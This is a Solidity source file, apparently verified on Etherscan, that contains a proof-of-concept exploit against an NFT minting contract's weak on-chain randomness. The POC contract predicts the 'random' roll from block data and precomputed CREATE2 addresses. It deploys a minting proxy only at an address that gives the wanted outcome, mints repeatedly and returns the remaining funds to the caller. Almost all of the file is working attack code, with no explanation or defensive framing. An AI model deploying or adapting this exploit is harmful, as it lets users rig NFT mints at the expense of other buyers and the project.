/**
 *Submitted for verification at Etherscan.io on 2022-01-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;
// import "hardhat/console.sol";

interface LdcNFT {
   function mint(address _to, uint256 _mintAmount) external payable;
}

contract LdcNFTttt is LdcNFT {
  function mint(address _to, uint256 _mintAmount) external payable override {

    }
}

contract POCCaller {

    address private owner;

    constructor(){}

    function setOwner(address newOwner) external {
        owner = newOwner;
    }

    function doMint(address nftAddress) external payable {
        LdcNFT(nftAddress).mint{value:msg.value}(owner, 1);
    }

}

contract POC {

    event Deployed(address addr, uint256 salt);
    event Found(address addr, uint256 loopId);

    bytes32 private callerHash;
    bytes private callerBytecode;

    constructor(){
        callerBytecode = abi.encodePacked(type(POCCaller).creationCode);
        callerHash = keccak256(callerBytecode);
    }

    // 1. Compute the address of the contract to be deployed
    function getAddress(uint _salt)
        internal
        view
        returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), _salt, callerHash)
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint(hash)));
    }

    // 2. Deploy the contract
    function deploy(uint _salt) public payable returns(address) {
        address addr;

        bytes memory _callerBytecode = callerBytecode;

        /*
        create2(v, p, n, s)
        create new contract with code at memory p to p + n
        and send v wei
        and return the new address
        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))
              s = big-endian 256-bit value
        */
        assembly {
            addr := create2(
                0,
                add(_callerBytecode, 0x20),
                mload(_callerBytecode),
                _salt
            )

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }

        emit Deployed(addr, _salt);
        return addr;
    }

    function test(address nftAddress, uint256 randWanted, uint256 loop, uint256 nmints) payable external{
        uint256 publicSaleCost = 10000000000000000; // 0.01 eth

        for (uint256 loopidx = 0; loopidx < loop; loopidx++) {
            uint randomnumber = uint(keccak256(abi.encodePacked(block.timestamp, block.difficulty, getAddress(loopidx)))) % 999;
        //    console.log(randomnumber);

            if (randomnumber < randWanted){
                address deployAddr = deploy(loopidx);
                POCCaller(deployAddr).setOwner(msg.sender);
                for(uint256 i; i < nmints; i++) {
                    POCCaller(deployAddr).doMint{value: publicSaleCost}(nftAddress);
                }
                payable(msg.sender).transfer(address(this).balance);
                emit Found(deployAddr, randomnumber);
                break;
            }
        }
    }
}